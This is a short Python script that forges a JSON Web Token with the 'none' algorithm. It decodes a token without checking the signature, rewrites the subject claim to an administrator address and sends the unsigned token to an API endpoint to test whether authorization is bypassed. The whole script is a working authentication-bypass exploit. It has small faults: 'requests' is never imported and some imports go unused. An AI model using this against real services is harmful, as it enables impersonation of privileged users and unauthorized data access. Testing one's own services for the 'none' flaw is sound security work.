import jwt
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# **Step 1: Decode JWT with no signature verification**

jwt_token = "YOUR_JWT_TOKEN_HERE"  # Replace with your actual token
try:
    payload = jwt.decode(jwt_token, None, algorithms=['none'], verify_signature=False)
except jwt.DecodeError:
    print("Invalid JWT token")
    exit()

payload['sub'] = 'admin@corp.com'  # Modify the sub claim


# **Step 2: Reencode JWT without signature**

encoded_token = jwt.encode(
    payload,  # Your payload with modified sub claim
    key=None, # Replace with your actual key 
    algorithm='none'  # Use 'none' for no signature 
)  

print(f"Encoded token: {encoded_token}")

# **Step 3: Injecting the JWT into a GET request**

base_url = "http://localhost:8080/api/documents/1" # Replace with your actual API endpoint

headers = {"Authorization": f"{encoded_token}"}
response = requests.get(base_url, headers=headers)

if response.status_code == 200:
    print("Request successful (401/403 not returned)")
else:
    print("Failed to get document")  # Or handle the response as needed.

